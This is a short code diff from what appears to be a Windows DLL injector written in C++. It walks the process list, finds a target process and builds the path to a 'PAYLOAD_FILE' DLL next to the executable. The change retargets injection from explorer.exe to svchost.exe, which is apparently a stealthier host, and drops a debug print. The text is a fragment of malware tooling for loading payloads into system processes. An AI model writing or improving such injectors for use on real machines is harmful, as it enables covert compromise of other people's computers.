@@ -19,6 +19,15 @@ std::string ChooseDLL()
 
 int main()
 {
+	//std::string stringPath = ChooseDLL();
+
+	char buffer[MAX_PATH];
+	GetModuleFileNameA(NULL, buffer, MAX_PATH);
+	std::string::size_type pos = std::string(buffer).find_last_of("\\/");
+	std::string stringPath = std::string(buffer).substr(0, pos) + PAYLOAD_FILE;
+
+	const char* dllPath = stringPath.c_str();
+
 	PROCESSENTRY32 entry;
 	entry.dwSize = sizeof(PROCESSENTRY32);
 
@@ -28,19 +37,9 @@ int main()
 	{
 		while (Process32Next(snapshot, &entry) == TRUE)
 		{
-			if (strcmp(entry.szExeFile, "explorer.exe") == 0)
+			if (strcmp(entry.szExeFile, "svchost.exe") == 0)
 			{
-				//std::string stringPath = ChooseDLL();
-				
-				char buffer[MAX_PATH];
-				GetModuleFileNameA(NULL, buffer, MAX_PATH);
-				std::string::size_type pos = std::string(buffer).find_last_of("\\/");
-				std::string stringPath = std::string(buffer).substr(0, pos) + PAYLOAD_FILE;
-
-				const char* dllPath = stringPath.c_str();
-
 				DWORD pID = entry.th32ProcessID;
-				std::cout << pID << std::endl;
 
 				if (!pID)
 				{
